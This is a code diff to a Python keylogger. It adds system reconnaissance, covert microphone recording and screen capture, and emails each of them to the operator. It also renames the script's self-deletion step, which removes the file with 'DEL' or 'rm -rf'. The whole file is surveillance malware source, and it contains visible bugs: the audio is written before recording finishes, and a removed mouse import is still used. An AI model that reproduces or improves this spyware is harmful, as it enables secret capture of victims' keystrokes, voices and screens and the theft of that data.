@@ -1,9 +1,14 @@
-import smtplib
-import threading
-from pynput import keyboard
-from pynput.mouse import Listener
 import logging
 import os
+import platform
+import smtplib
+import socket
+import threading
+import wave
+import pyscreenshot
+import sounddevice as sd
+from pynput import keyboard
+from pynput.keyboard import Listener
 
 
 class KeyLogger:
@@ -54,6 +59,35 @@ class KeyLogger:
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
+    def system_information(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        plat = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+        self.appendlog(hostname)
+        self.appendlog(ip)
+        self.appendlog(plat)
+        self.appendlog(system)
+        self.appendlog(machine)
+
+    def microphone(self):
+        fs = 44100
+        seconds = 10
+        obj = wave.open('sound.wav', 'w')
+        obj.setnchannels(1)  # mono
+        obj.setsampwidth(2)
+        obj.setframerate(fs)
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        obj.writeframesraw(myrecording)
+        sd.wait()
+
+        self.send_mail(email="MAIL", password="PASSWORD", message=obj)
+
+    def screenshot(self):
+        img = pyscreenshot.grab()
+        self.send_mail(email="MAIL", password="PASSWORD", message=img)
+
     def run(self):
         keyboard_listener = keyboard.Listener(on_press=self.save_data)
         with keyboard_listener:
@@ -63,22 +97,24 @@ class KeyLogger:
             mouse_listener.join()
         if os.name == "nt":
             try:
-                os.system("YOUR DIRECTORY")
-                os.rename('main.py', 'main.bat')
-                os.rename('main.bat', 'main.py')
+                pwd = os.path.abspath(os.getcwd())
+                os.system("cd " + pwd)
+                os.rename('keylogger.py', 'keylogger.bat')
+                os.rename('keylogger.bat', 'keylogger.py')
             except OSError:
                 print('File is still open.')
-                os.system("DEL main.py")
+                os.system("DEL keylogger.py")
 
         else:
             try:
-                os.system("YOUR DIRECTORY")
-                os.rename('main.py', 'main.bat')
-                os.rename('main.bat', 'main.py')
+                pwd = os.path.abspath(os.getcwd())
+                os.system("cd " + pwd)
+                os.rename('keylogger.py', 'keylogger.bat')
+                os.rename('keylogger.bat', 'keylogger.py')
             except OSError:
                 print('File is still open.')
-                os.system("rm -rf main.py")
+                os.system("rm -rf keylogger.py")
 
 
-keylogger = KeyLogger(10, 'YOUR MAIL', 'PASSWORD')
+keylogger = KeyLogger(10, 'MAIL', 'PASSWORD')
 keylogger.run()
